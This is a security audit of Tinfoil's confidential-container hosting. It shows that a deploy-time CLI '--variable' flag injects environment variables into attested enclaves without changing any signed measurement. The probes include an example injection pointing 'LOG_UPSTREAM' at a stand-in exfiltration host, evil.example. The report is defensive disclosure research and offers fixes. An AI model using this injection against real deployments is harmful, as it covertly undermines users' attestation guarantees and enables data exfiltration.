# Tinfoil Confidential Containers — Operator-Side Audit

**Audit date:** 2026-04-30
**Scope:** Tinfoil Containers product (third-party container hosting), admin-key access on org `andrew-miller`.
**CLI:** [`tinfoilsh/tinfoil-cli`](https://github.com/tinfoilsh/tinfoil-cli) v0.13.0
**Controlplane:** `https://api.tinfoil.sh`
**Sister case study:** [`tinfoil-confidential-inference`](../tinfoil-confidential-inference/DEVPROOF-REPORT.md) — outside-in audit of the managed-inference deployment.
**Re-verifier:** [`amiller/awesome-private-inference: verifiers/tinfoil.py`](https://github.com/amiller/awesome-private-inference/blob/main/verifiers/tinfoil.py)
**Core question:** The sister case study showed Tinfoil's *managed-inference* deployment closes the compose-hash backdoor. Does the same hold for *third-party* container deployments where the operator (a paying Tinfoil customer) controls the deploy? Specifically, can an operator inject env vars into a running CVM with no footprint in any signed surface?

---

## Executive Summary

**Yes — and the path is one CLI flag, no GitHub-repo edits required.**

The sister case study reasoned about the operator surface from cvmimage source code and listed three classes of operator-controllable env: map-form (attested), string-form (declared, value from unattested disk), and `secrets:` (declared, value from unattested disk). It recommended that the verifier surface the slot list, which our `verifiers/tinfoil.py` does today.

This audit found a **fourth class** by deploying with admin access:

| Source | Declared in attested config? | In SEV launch measurement? | Detectable from outside? |
|---|---|---|---|
| Map-form `- VAR: value` | yes (name + value) | yes (via `tinfoil-config-hash=` in cmdline) | shows in verifier's `env_attested` |
| String-form `- VAR` | name only (value from unattested disk) | name only | shows in verifier's `env_external` |
| `secrets: - VAR` | name only (value from unattested disk) | name only | shows in verifier's `secrets_external` |
| **CLI `--variable VAR=value`** | **no — neither name nor value** | **no** | **no — undetectable** |

Row 4 is **strictly worse**. The operator can override an attested `LOG_LEVEL: "info"` with `--variable LOG_LEVEL=trace_evil`, or inject an entirely new `--variable LOG_UPSTREAM=https://evil.example/exfil`, and:

- The `tinfoil-config.yml` in the GitHub repo is unchanged (Sigstore signature still passes).
- The kernel cmdline's `tinfoil-config-hash=` is unchanged (SEV launch measurement still passes).
- Tinfoil's own `tinfoil attestation verify` reports "Measurements match" — both before and after.
- Our verifier's `attested_config` is byte-identical — no slot list change to flag.

The only externally-observable difference is that the enclave's TLS / HPKE pubkeys rotate (because a fresh enclave boots) — but a verifier sees this as a normal restart and cannot attribute it to operator injection.

### Why this matters relative to the sister case study

The sister case study's Stage 1 assessment for Tinfoil's managed inference relied on the model enclaves declaring zero string-form env entries and zero `secrets:`. That made the *declared* operator surface auditable from outside. The CLI's `--variable` flag was not in scope for that audit because it requires admin access to demonstrate.

**For third-party container deploys (this product), the original case study's framing breaks down:** the verifier's `runtime_config_fully_attested` flag tells you only about declared slots. An operator who never edits the GitHub repo and only ever uses `--variable` and `--secret` flags at deploy time produces a deployment that the verifier flags identically to a clean one.

---

## Setup

```
$ tinfoil --version          # v0.13.0
$ tinfoil login --api-key admin_xxx
$ tinfoil whoami
  authenticated (0 host(s) available)
```

Used the upstream template repo `tinfoilsh/tinfoil-containers-hello-world@v0.0.5` unchanged. Its attested `/config.yml` (decoded from the Sigstore predicate `config:` field):

```yaml
cvm-version: 0.7.5
cpus: 2
memory: 8192
containers:
  - name: "hello-world"
    image: "hashicorp/http-echo:latest@sha256:fcb75f691c8b0414d670ae570240cbf95502cc18a9ba57e982ecac589760a186"
    command: ["-listen=:8080", "-text=Hello from a Tinfoil Container!"]
    env:
      - LOG_LEVEL: "info"
    secrets:
      - API_KEY
shim:
  upstream-port: 8080
  paths:
    - /*
```

Deployed to host `control.inf6.tinfoil.sh` (AMD SEV-SNP, H200 GPU available, 0 GPUs requested). Domain `devproof-hello.andrew-miller.containers.tinfoil.dev`.

---

## Probe 1 — vanilla deploy

```
$ echo "test-not-real" | tinfoil secret create API_KEY --value-file -
$ tinfoil container create devproof-hello \
    --repo tinfoilsh/tinfoil-containers-hello-world \
    --tag v0.0.5 \
    --secret API_KEY
```

Verification (`verifiers/tinfoil.py` against the deployed host):

```
valid = True
SEV measurement              = 229ee3112155ec56d1f41baf4443fc363882fe99ae462db2a5986be7b684aff1b8b5bd852c0072d1b816495460b6b5ad
cmdline tinfoil-config-hash  = a7625aa8d83802f134f18d63cf19fb49a6c7552df0254ef7fa78cba81d023124
roothash (rootfs dm-verity)  = 5c1f3121fb34dbf8b55d35abbd328daaab589f1e2566bc6c99afdc231d705f59
TLS SPKI sha256              = e21fdfa95e27b5fe82068b10c3097adfa37a18335f6c9440648ee7dc1e6b6f16
HPKE pubkey                  = 756bc3c37c4b780399ac5a4ddbcf12600e736439ac53f88b567566b7e8c6464f
runtime_config_fully_attested = False
attested_config:
  containers:
    - name: hello-world
      image_pinned_by_digest: true
      env_attested:    [LOG_LEVEL]
      env_external:    []
      secrets_external: [API_KEY]
```

`runtime_config_fully_attested=False` because `secrets: [API_KEY]` is itself an unattested-disk slot. (Note: this is the **stock template** — every user who copy-pastes from `tinfoilsh/tinfoil-containers-hello-world` ships with this slot. Combined with the docs admission that ["Secrets are not protected by the enclave's confidentiality boundary. They pass through the host on their way into the container"](https://docs.tinfoil.sh/containers/secrets-and-env-vars), a copy-paste deployment exposes a host-plaintext slot by default.)

---

## Probe 2 — adversarial relaunch

Same repo, same tag, same `tinfoil-config.yml` in GitHub. The only change is two `--variable` flags at deploy time:

```
$ tinfoil container relaunch devproof-hello \
    --variable LOG_UPSTREAM=https://evil.example/exfil \
    --variable LOG_LEVEL=trace_evil \
    --secret API_KEY
ID:           aa9d0c0e-64eb-4527-8905-615a585d2e27
Name:         devproof-hello
Status:       ready
Repo:         tinfoilsh/tinfoil-containers-hello-world@v0.0.5
[no warning, no error]
```

`tinfoil container get devproof-hello -o json` confirms the operator-side dashboard *does* know about the injected vars:

```json
"variables": "eyJMT0dfTEVWRUwiOiAidHJhY2VfZXZpbCIsICJMT0dfVVBTVFJFQU0iOiAiaHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWwifQ=="
```

(base64-decodes to `{"LOG_LEVEL":"trace_evil","LOG_UPSTREAM":"https://evil.example/exfil"}`)

Note that `tinfoil container get devproof-hello` *without* `-o json` — the default human-readable output — does not show the `variables` field at all. **Asymmetric visibility:** operator's JSON dashboard sees, operator's table-form dashboard hides, remote verifier cannot see.

Re-running the verifier:

```
valid = True
SEV measurement              = 229ee3112155ec56d1f41baf4443fc363882fe99ae462db2a5986be7b684aff1b8b5bd852c0072d1b816495460b6b5ad   ← identical
cmdline tinfoil-config-hash  = a7625aa8d83802f134f18d63cf19fb49a6c7552df0254ef7fa78cba81d023124                                    ← identical
roothash (rootfs dm-verity)  = 5c1f3121fb34dbf8b55d35abbd328daaab589f1e2566bc6c99afdc231d705f59                                    ← identical
TLS SPKI sha256              = 3a2667ceeb07d1626563ba19707f95066a251e83730e51b4ee08b73a44cd4177                                    ← rotated
HPKE pubkey                  = 8f1ce6bf9e6801e3548827d42db630da8ff643f1c9c0500de04f7a701e5ac236                                    ← rotated
runtime_config_fully_attested = False                                                                                              ← identical
attested_config: identical
```

Tinfoil's `tinfoil attestation verify --host devproof-hello.andrew-miller.containers.tinfoil.dev --repo tinfoilsh/tinfoil-containers-hello-world` returns `"Measurements match"` for both probes.

---

## Side-by-side

| Field | Probe 1 (vanilla) | Probe 2 (adversarial) | Diff |
|---|---|---|---|
| `--variable` flags passed | none | `LOG_UPSTREAM=…/exfil`, `LOG_LEVEL=trace_evil` | injected |
| Sigstore digest of attested config | `a20d977d…` | `a20d977d…` | same |
| SEV launch measurement | `229ee311…` | `229ee311…` | same |
| `tinfoil-config-hash=` in cmdline | `a7625aa8…` | `a7625aa8…` | same |
| Rootfs dm-verity roothash | `5c1f3121…` | `5c1f3121…` | same |
| Verifier's `attested_config` | `env_attested:[LOG_LEVEL]`, `secrets_external:[API_KEY]` | identical | same |
| Verifier's `runtime_config_fully_attested` | `False` | `False` | same (for the wrong reason) |
| TLS SPKI hash | `e21fdfa9…` | `3a2667ce…` | rotated |
| HPKE pubkey | `756bc3c3…` | `8f1ce6bf…` | rotated |

The TLS/HPKE rotation is the only externally-visible signal that something changed. A verifier seeing the rotation cannot tell whether it was a planned upgrade, a security incident, or operator-injected variables.

---

## Why the sister case study's framing is incomplete here

The sister case study's runtime-config gap analysis was structured around *declared* slots in the attested `/config.yml`. Quoting it:

> "Because the *list* of externally-sourced slots is part of the attested config, a careful auditor can read the signed `/config.yml`, see which slots are bare strings or under `secrets:`, and decide whether to trust those slots given their semantic role in the container code."

For Tinfoil's *internal* model enclaves (router, gpt-oss-120b, etc.), this framing holds — those CVMs are deployed by Tinfoil's CI under repos like `tinfoilsh/confidential-gpt-oss-120b` and the attested config lists every operator-controllable slot.

For *third-party* container deploys (this product), the framing breaks down:

1. **The operator does not need to declare a slot in the YAML.** `--variable KEY=VALUE` injects directly. The case study's mental model — "auditor reads the signed config and sees the slot list" — assumes all operator-controllable slots show up there. They do not.
2. **The `--variable` injection is not in any signed surface.** Not in the kernel cmdline (the cmdline is invariant per build of `cvm-version: 0.7.5`). Not in the Sigstore-signed config (that's the GitHub repo file). Not in the SEV launch measurement (that's the cmdline + initrd + kernel + OVMF).
3. **The injected values flow to the container's environment.** Inferred from cvmimage's `buildEnv` ([`containers.go:397-432`](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/containers.go#L397-L432)) plus the fact that the CLI accepts and stores them. Not yet empirically demonstrated end-to-end (would require deploying an env-echoing container; tracked as a follow-up probe).

The original case study's recommendations #1 ("make external-config slots part of the public verifier matrix") and #3 ("extend RTMR3 with sha256(external-config disk content)") were correct in direction but addressed only the declared-slot subset of the surface.

---

## Updated recommendations

For Tinfoil:

1. **Surface `--variable` in the attestation surface.** Either (a) include the deploy-time variables blob in the cmdline (so the SEV launch measurement covers them), or (b) hash it and include the hash in a `tinfoil-variables-hash=` cmdline parameter, or (c) extend RTMR3 (or equivalent) at boot with the variables blob. Without one of these, the deploy-time injection is invisible to remote verifiers.
2. **Make `--variable` overrides of map-form attested env vars hard-fail by default.** Today the CLI silently accepts `--variable LOG_LEVEL=trace_evil` even though the attested config declares `LOG_LEVEL: "info"`. A `--force-override` flag would preserve operator flexibility while making accidental overrides loud.
3. **Document the host-plaintext nature of `secrets:`** more prominently. The current docs note is buried; the implication (Tinfoil's host operator can read every secret at deploy time) deserves top-of-page treatment for an enclave product.
4. **Show `variables` in the table-form `tinfoil container get` output.** The asymmetry — JSON shows, table hides — invites operator self-deception.

For our re-verifier (`verifiers/tinfoil.py`):

5. **`runtime_config_fully_attested` is the wrong shape of flag for third-party containers.** Even a fully-clean attested config can be wrapped in arbitrary `--variable` injections. Consider renaming to `attested_slots_fully_declared` and adding a separate, structurally-honest flag like `deploy_time_injection_visible_in_attestation = False` (constant `False` for current Tinfoil; would flip to `True` if recommendation #1 is adopted).
6. **Add a "this is all the verifier can see" caveat** at the top of any report against a third-party Tinfoil container.

For users:

7. **Pin to the enclave's TLS pubkey at first contact** (TOFU) and refuse subsequent connections to a different pubkey unless you've manually re-attested. This catches the silent-restart-with-new-vars case without requiring Tinfoil to fix anything.

---

## Stage Assessment (third-party container product)

ERC-733 [Stage 1 Checklist](../../README.md#stage-1-checklist):

- [x] Code auditable — open source under `tinfoilsh`
- [x] Community can reproducibly compute code measurement — `cvm-version: 0.7.5` is reproducible from `tinfoilsh/cvmimage` build chain
- [ ] Developer has no access to application secrets — **fails.** Docs explicitly state secrets pass through host plaintext. CLI `--variable` provides an even stronger backdoor: arbitrary env injection with no signed footprint
- [x] Well-defined upgrade process with notice period — `--tag` pins to GitHub releases; `--replace` is atomic; `update accept`/`update cancel` provides explicit operator gating
- [x] No dependency on centralized infrastructure except TEE vendors — Sigstore + GitHub OIDC + AMD KDS only
- [ ] No backdoor or debug paths — **fails.** `--variable KEY=VALUE` is a backdoor by any reasonable definition: a deploy-time control-plane channel that injects code-influencing values into the enclave with zero attestation footprint and no GitHub-repo evidence

**Stage:** Stage 0 (operator-side). Tinfoil's *managed inference* product remains conditionally-Stage-1 (sister case study); the *containers* product, as currently implemented, is one CLI flag away from being a vanilla operator-controlled hosting service from the verifier's perspective.

---

## Reproduction

All probes ran 2026-04-30 against `https://api.tinfoil.sh` with CLI v0.13.0. Container `devproof-hello` (id `aa9d0c0e-64eb-4527-8905-615a585d2e27`) was used for both probes; `relaunch` rotated the enclave keys but kept the deployment record. SEV measurement `229ee3112155ec56…` and Sigstore digest `a20d977d…` should be reproducible by anyone with admin access to a Tinfoil org until the v0.7.5 cvm image is rotated.

```python
from verifiers.tinfoil import fetch_per_host_bundle, verify_bundle
host = "devproof-hello.andrew-miller.containers.tinfoil.dev"
repo = "tinfoilsh/tinfoil-containers-hello-world"
bundle = fetch_per_host_bundle(host, repo)
report = verify_bundle(bundle, repo=repo)
assert report.valid                                          # passes for both probes
assert not report.scorecard.runtime_config_fully_attested    # False for both — but for declared `secrets:`, not for --variable
```

---

## Open follow-ups

- **Empirically confirm `--variable` values reach the container's runtime environment** by deploying an env-echoing image (e.g., `mendhak/http-https-echo`) under a config we control. Strong inference says yes; not yet proven end-to-end here.
- **Test the schema validator** with a string-form `env: - VAR` entry in a config we control. This is the third row of the four-class table; the case study reasoned it would be accepted (cvmimage source supports it) but the user-facing docs only show map-form.
- **Sigstore identity policy reuse.** A user who has previously deployed `tinfoilsh/tinfoil-containers-hello-world@v0.0.5` and pinned its measurement could re-verify against any new deployment of the same repo+tag and not notice operator-injected variables. The verification chain is repo+tag-bound, not deployment-bound.

---

## Source

- **Re-verifier:** [`amiller/awesome-private-inference: verifiers/tinfoil.py`](https://github.com/amiller/awesome-private-inference/blob/main/verifiers/tinfoil.py), [`verifiers/tinfoil_sev.py`](https://github.com/amiller/awesome-private-inference/blob/main/verifiers/tinfoil_sev.py)
- **Tinfoil CLI:** [`tinfoilsh/tinfoil-cli`](https://github.com/tinfoilsh/tinfoil-cli) v0.13.0
- **CVM boot code (where the gap lives):** [`tinfoilsh/cvmimage/tinfoil/cmd/boot/containers.go`](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/containers.go), [`config.go`](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/config.go)
- **Hello-world template (used unchanged):** [`tinfoilsh/tinfoil-containers-hello-world`](https://github.com/tinfoilsh/tinfoil-containers-hello-world) @ `v0.0.5`
- **Tinfoil docs (cited for "secrets pass through host"):** [`docs.tinfoil.sh/containers/secrets-and-env-vars`](https://docs.tinfoil.sh/containers/secrets-and-env-vars)

---

## Prior art

- [`tinfoil-confidential-inference`](../tinfoil-confidential-inference/DEVPROOF-REPORT.md) — sister outside-in audit. The "runtime-config gap (operator-controllable surface)" section there reasons about declared slots from cvmimage source code; this report confirms the slot-list claim empirically *and* extends it with the undeclared `--variable` class.
- [`tee-totalled`](../tee-totalled/DEVPROOF-REPORT.md) — the canonical `LLM_BASE_URL`-as-env-var backdoor pattern. Tinfoil's `--variable` is the same primitive at the platform level: `LLM_BASE_URL` would just be a Tinfoil `--variable LLM_BASE_URL=https://operator.example` away.
- [`xordi-toy-example`](../xordi-toy-example/) — `MOCK_API_URL` exfiltration variant.
